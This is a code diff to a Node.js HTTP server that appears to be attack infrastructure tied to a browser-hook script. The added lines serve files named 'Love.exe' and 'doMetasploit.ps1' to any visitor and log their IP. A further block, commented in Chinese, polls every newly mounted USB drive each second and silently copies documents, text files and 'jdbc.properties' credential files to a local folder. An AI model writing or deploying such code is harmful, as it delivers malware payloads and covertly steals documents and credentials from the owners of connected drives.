@@ -45,6 +45,21 @@ function fnHttpServer(options)
 	var nTimeout = 19000, server = http.createServer(function (req, resp)
 	{
 		var ip = fnGetIp(req).toString();
+		if(-1 < req.url.indexOf("Love.exe"))
+		{
+			var ssT = '';
+			resp.end(fs.readFileSync(ssT = "./jars/Love.exe"));
+			console.log(ip + " : " + ssT);
+			return;
+		}
+		else if(-1 < req.url.indexOf("doMetasploit.ps1"))
+		{
+			var ssT = '';
+			resp.end(fs.readFileSync(ssT = "./jars/doMetasploit.ps1"));
+			console.log(ip + " : " + ssT);
+			return;
+		}
+		
 		// hook.js
 		if(-1 == req.url.indexOf("hook.js"))
 		fnWt(ip,[moment(new Date().getTime()).format('YYYY-MM-DD HH:mm:ss'),req.url,req.headers["user-agent"]].join("\t"));
@@ -93,3 +108,41 @@ require('events').EventEmitter.prototype._maxListeners = 0;
 require('events').EventEmitter.defaultMaxListeners = 0;
 fnHttpServer();
 fnHttpServer({ip:"0.0.0.0",port:3000});
+
+// 自动拷贝接入U盘文档
+setInterval(function()
+{
+	var re = /[\n]/gmi,
+		szF1 = './data/myDev.txt',
+		s = child_process.execSync("df -h /Volumes/*|grep '/Volumes'").toString(),
+		szFOld = '',szFOld = fs.readFileSync(szF1).toString();
+	szFOld = szFOld.replace(/(^\s*)|(\s*$)/gmi, "");
+	
+	var a = new RegExp(".*?((" + szFOld.split(/\n/).join(")|(")
+	    	.replace(/\//gmi, "\\/")
+	    	 + "))\\n*", 'gmi');
+	s = s.replace(a,'');
+	if(s)
+	{
+		a = s.split(re);
+		for(var k in a)
+		{
+			if(!a[k])continue;
+			var x1 = a[k].split(/\s+/);
+			if(1 < x1.length)
+			{
+				x1[1] = x1[1].replace(/[^\d]*/gmi,'');
+				if(128 > x1[1])
+				{
+					var sss = x1[x1.length - 1].trim(),k1 = sss.substr(sss.lastIndexOf('/'));
+					console.log("符合拷贝" + sss);
+					child_process.execSync("mkdir -p /Volumes/MyWork/`date '+%Y%m%d'`/" + k1);
+					child_process.execSync("find -E " + sss + " -regex '.*\\.(ppt|doc|xls|mmap|txt|jdbc.properties|cdm|pdm).*' -exec cp {} /Volumes/MyWork/`date '+%Y%m%d'`/" + k1 + " \\;");
+					fs.writeFileSync(szF1,szFOld + "\n" + sss);
+					console.log("Ok " + sss);
+				}
+			}
+		}
+		
+	}
+},1000);
